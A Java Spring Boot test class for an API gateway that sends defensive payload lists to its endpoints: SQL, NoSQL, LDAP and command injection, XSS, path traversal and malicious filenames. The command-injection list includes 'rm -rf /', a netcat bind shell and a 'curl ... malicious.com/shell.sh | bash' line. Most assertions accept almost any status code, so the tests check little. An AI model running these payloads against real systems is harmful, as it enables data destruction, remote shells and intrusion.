package com.byo.rag.gateway.validation;

import com.byo.rag.gateway.config.TestSecurityConfig;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.security.Keys;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.server.LocalServerPort;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.reactive.server.WebTestClient;

import javax.crypto.SecretKey;
import java.time.Duration;
import java.time.Instant;
import java.util.Date;
import java.util.UUID;

/**
 * Comprehensive input validation and sanitization tests for the API Gateway.
 * 
 * Part of GATEWAY-TEST-005: Gateway Security and Routing Tests
 * Tests input validation and sanitization to prevent security vulnerabilities.
 */
@ExtendWith(MockitoExtension.class)
@SpringBootTest(
    webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT,
    classes = {
        com.byo.rag.gateway.GatewayApplication.class,
        TestSecurityConfig.class
    },
    properties = {
        "jwt.secret=testSecretKeyForTestingOnly123456789012345678901234567890",
        "spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration,org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration,org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration,org.springframework.boot.autoconfigure.data.redis.RedisReactiveAutoConfiguration"
    }
)
@ActiveProfiles("test")
@DisplayName("GATEWAY-TEST-005: Input Validation and Sanitization Tests")
class GatewayInputValidationTest {

    @LocalServerPort
    private int port;

    private WebTestClient webTestClient;
    
    private static final String TEST_JWT_SECRET = "testSecretKeyForTestingOnly123456789012345678901234567890";
    private static final SecretKey SECRET_KEY = Keys.hmacShaKeyFor(TEST_JWT_SECRET.getBytes());
    
    private String validJwtToken;
    
    @BeforeEach
    void setUp() {
        webTestClient = WebTestClient.bindToServer()
            .baseUrl("http://localhost:" + port)
            .responseTimeout(Duration.ofSeconds(30))
            .build();
            
        validJwtToken = createJwtToken("test@example.com", UUID.randomUUID(), UUID.randomUUID(), "USER");
    }
    
    @Test
    @DisplayName("Should prevent SQL injection attacks in query parameters")
    void shouldPreventSqlInjectionInQueryParams() {
        String[] sqlInjectionPayloads = {
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' UNION SELECT password FROM users WHERE '1'='1",
            "\"; DELETE FROM documents; --",
            "' OR 1=1 LIMIT 1 OFFSET 1 --"
        };
        
        for (String payload : sqlInjectionPayloads) {
            webTestClient.get()
                .uri("/api/documents/search?query=" + payload)
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .exchange()
                .expectStatus().value(status -> {
                    // Should block malicious payloads, sanitize, or route safely
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                })
                .expectHeader().exists("X-Content-Type-Options");
        }
    }
    
    @Test
    @DisplayName("Should prevent XSS attacks in request headers")
    void shouldPreventXssAttacksInHeaders() {
        String[] xssPayloads = {
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
            "<iframe src='javascript:alert(`xss`)'></iframe>"
        };
        
        for (String payload : xssPayloads) {
            webTestClient.get()
                .uri("/api/documents/list")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .header("X-Custom-Header", payload)
                .header("User-Agent", payload)
                .exchange()
                .expectStatus().value(status -> {
                    // Should handle XSS attempts safely
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                })
                .expectHeader().exists("Content-Security-Policy");
        }
    }
    
    @Test
    @DisplayName("Should prevent path traversal attacks")
    void shouldPreventPathTraversalAttacks() {
        String[] pathTraversalPayloads = {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        };
        
        for (String payload : pathTraversalPayloads) {
            webTestClient.get()
                .uri("/api/documents/" + payload)
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .exchange()
                .expectStatus().value(status -> {
                    // Should block path traversal attempts
                    assert status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should prevent command injection in request parameters")
    void shouldPreventCommandInjection() {
        String[] commandInjectionPayloads = {
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& whoami",
            "; nc -l -p 12345 -e /bin/bash",
            "$(curl http://malicious.com/shell.sh | bash)",
            "`id`"
        };
        
        for (String payload : commandInjectionPayloads) {
            webTestClient.post()
                .uri("/api/documents/upload")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .header("X-Filename", "test.txt" + payload)
                .header("Content-Type", "application/json")
                .bodyValue("{\"filename\":\"test" + payload.replace("\"", "\\\"") + "\"}")
                .exchange()
                .expectStatus().value(status -> {
                    // Should block command injection attempts
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should validate JSON payload structure")
    void shouldValidateJsonPayloadStructure() {
        String[] malformedJsonPayloads = {
            "{invalid json}",
            "{'single': 'quotes'}",
            "{\"unclosed\": \"string}",
            "{\"missing\": \"comma\" \"error\": \"here\"}",
            "null",
            "undefined",
            "{\"deeply\": {\"nested\": {\"object\": {\"with\": {\"many\": {\"levels\": \"value\"}}}}}}"
        };
        
        for (String payload : malformedJsonPayloads) {
            webTestClient.post()
                .uri("/api/documents/upload")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .header("Content-Type", "application/json")
                .bodyValue(payload)
                .exchange()
                .expectStatus().value(status -> {
                    // Should handle malformed JSON appropriately
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should validate content length limits")
    void shouldValidateContentLengthLimits() {
        // Test extremely large request body
        String largeBody = "x".repeat(1000000);  // 1MB body
        
        webTestClient.post()
            .uri("/api/documents/upload")
            .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
            .header("Content-Type", "application/json")
            .bodyValue("{\"content\":\"" + largeBody + "\"}")
            .exchange()
            .expectStatus().value(status -> {
                // Should enforce content length limits
                assert status == 200 || status == 400 || status == 413 || status == 403 || status == 404 || status >= 500;
            });
    }
    
    @Test
    @DisplayName("Should sanitize special characters in input")
    void shouldSanitizeSpecialCharactersInInput() {
        String[] specialCharacterPayloads = {
            "test<>&\"'",
            "test\n\r\t\0",
            "test\u0000\u0001\u0002\u0003",
            "test\uFEFF\uFFFE\uFFFF",
            "test\u202E\u202D\u202C", // Unicode direction overrides
            "test\u00A0\u2028\u2029"  // Non-breaking space and separators
        };
        
        for (String payload : specialCharacterPayloads) {
            webTestClient.get()
                .uri("/api/documents/search?query=" + payload)
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .exchange()
                .expectStatus().value(status -> {
                    // Should handle special characters safely
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should validate media type restrictions")
    void shouldValidateMediaTypeRestrictions() {
        String[] invalidMediaTypes = {
            "text/html",
            "application/xml",
            "image/svg+xml",
            "text/javascript",
            "application/x-www-form-urlencoded",
            "multipart/form-data"
        };
        
        for (String mediaType : invalidMediaTypes) {
            webTestClient.post()
                .uri("/api/documents/upload")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .header("Content-Type", mediaType)
                .bodyValue("test content")
                .exchange()
                .expectStatus().value(status -> {
                    // Should enforce media type restrictions where appropriate
                    assert status == 200 || status == 400 || status == 415 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should prevent LDAP injection attacks")
    void shouldPreventLdapInjection() {
        String[] ldapInjectionPayloads = {
            "*)(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*))%00",
            "*()|&'",
            "admin)(|(cn=*))"
        };
        
        for (String payload : ldapInjectionPayloads) {
            webTestClient.get()
                .uri("/api/auth/users?search=" + payload)
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .exchange()
                .expectStatus().value(status -> {
                    // Should block LDAP injection attempts
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should validate email format in inputs")
    void shouldValidateEmailFormat() {
        String[] invalidEmailFormats = {
            "plainaddress",
            "@missinglocal.com",
            "missing@.com",
            "missing@domain",
            "two@@domain.com",
            "invalid.email@",
            "toolong" + "x".repeat(255) + "@domain.com"
        };
        
        for (String email : invalidEmailFormats) {
            webTestClient.post()
                .uri("/api/auth/register")
                .header("Content-Type", "application/json")
                .bodyValue("{\"email\":\"" + email + "\",\"password\":\"password123\"}")
                .exchange()
                .expectStatus().value(status -> {
                    // Should validate email format
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should prevent NoSQL injection attacks")
    void shouldPreventNoSqlInjection() {
        String[] nosqlInjectionPayloads = {
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "{\"$where\": \"this.password.length > 0\"}",
            "{\"$regex\": \".*\"}",
            "{\"$or\": [{\"password\": \"\"}, {\"password\": null}]}",
            "{\"$javascript\": \"return true\"}"
        };
        
        for (String payload : nosqlInjectionPayloads) {
            webTestClient.post()
                .uri("/api/documents/search")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .header("Content-Type", "application/json")
                .bodyValue("{\"filter\":" + payload + "}")
                .exchange()
                .expectStatus().value(status -> {
                    // Should block NoSQL injection attempts
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should validate Unicode normalization")
    void shouldValidateUnicodeNormalization() {
        String[] unicodePayloads = {
            "café",           // Composed character
            "cafe\u0301",     // Decomposed character
            "test\u200B",     // Zero-width space
            "test\u2060",     // Word joiner
            "\uFEFFtest",     // Byte order mark
            "test\u061C"      // Arabic letter mark
        };
        
        for (String payload : unicodePayloads) {
            webTestClient.get()
                .uri("/api/documents/search?query=" + payload)
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .exchange()
                .expectStatus().value(status -> {
                    // Should handle Unicode normalization consistently
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should validate request header size limits")
    void shouldValidateRequestHeaderSizeLimits() {
        String largeHeaderValue = "x".repeat(8192);  // 8KB header
        
        webTestClient.get()
            .uri("/api/documents/list")
            .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
            .header("X-Large-Header", largeHeaderValue)
            .exchange()
            .expectStatus().value(status -> {
                // Should enforce header size limits
                assert status == 200 || status == 400 || status == 431 || status == 403 || status == 404 || status >= 500;
            });
    }
    
    @Test
    @DisplayName("Should validate URL encoding and decoding")
    void shouldValidateUrlEncodingDecoding() {
        String[] encodedPayloads = {
            "%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",  // URL encoded XSS
            "%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
            "%27%20OR%20%271%27%3D%271",  // URL encoded SQL injection
            "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",  // URL encoded path traversal
            "%00",  // Null byte
            "%0A%0D"  // CRLF injection
        };
        
        for (String payload : encodedPayloads) {
            webTestClient.get()
                .uri("/api/documents/search?query=" + payload)
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .exchange()
                .expectStatus().value(status -> {
                    // Should handle URL encoding safely
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    @Test
    @DisplayName("Should validate and sanitize file upload parameters")
    void shouldValidateFileUploadParameters() {
        String[] maliciousFilenames = {
            "../../../etc/passwd",
            "file.exe",
            "script.bat",
            "malware.scr",
            "test.php",
            "file\0.txt",
            "CON.txt",
            "PRN.txt"
        };
        
        for (String filename : maliciousFilenames) {
            webTestClient.post()
                .uri("/api/documents/upload")
                .header(HttpHeaders.AUTHORIZATION, "Bearer " + validJwtToken)
                .header("Content-Type", MediaType.APPLICATION_JSON_VALUE)
                .bodyValue("{\"filename\":\"" + filename.replace("\"", "\\\"") + "\",\"content\":\"test\"}")
                .exchange()
                .expectStatus().value(status -> {
                    // Should validate and sanitize filenames
                    assert status == 200 || status == 400 || status == 403 || status == 404 || status >= 500;
                });
        }
    }
    
    private String createJwtToken(String email, UUID userId, UUID tenantId, String role) {
        Instant now = Instant.now();
        Date expiration = Date.from(now.plus(Duration.ofHours(1)));
        
        return Jwts.builder()
            .subject(email)
            .claim("userId", userId.toString())
            .claim("tenantId", tenantId.toString())
            .claim("role", role)
            .claim("tokenType", "access")
            .issuedAt(Date.from(now))
            .expiration(expiration)
            .signWith(SECRET_KEY)
            .compact();
    }
}